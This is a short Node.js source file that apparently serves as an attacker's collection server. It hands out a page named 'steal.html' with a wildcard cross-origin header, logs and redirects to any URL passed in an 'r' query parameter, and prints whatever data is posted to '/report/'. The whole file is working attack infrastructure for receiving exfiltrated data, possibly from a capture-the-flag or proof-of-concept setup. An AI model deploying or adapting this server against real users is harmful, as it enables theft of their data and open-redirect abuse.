var http = require('http');
var fs = require('fs');
var url = require('url');
var server = http.createServer(function (req, res) {
    if (req.url == "/index.html") {
        res.setHeader('Access-Control-Allow-Origin', '*');
        fs.createReadStream('steal.html').pipe(res);
    } else if (/\?r=.*/.test(req.url)) {
        var queries = url.parse(req.url, true);
        console.log('Extracted path: ' + decodeURIComponent(queries.query['r']));
        res.writeHead(302, {Location: decodeURIComponent(queries.query['r'])});
        res.end();
    } else if (req.url == '/report/') {
        var content = '';
        req.on('data', function (d) {
            content += d;
        });
        req.on('end', function () {
            console.log(content);
            res.end();
        });
    } else {
        res.writeHead(302, {Location: "/index.html"});
        res.end();
    }
});
server.listen(1337, function () {
    console.log('Server running at http://127.0.0.1:1337/');
});
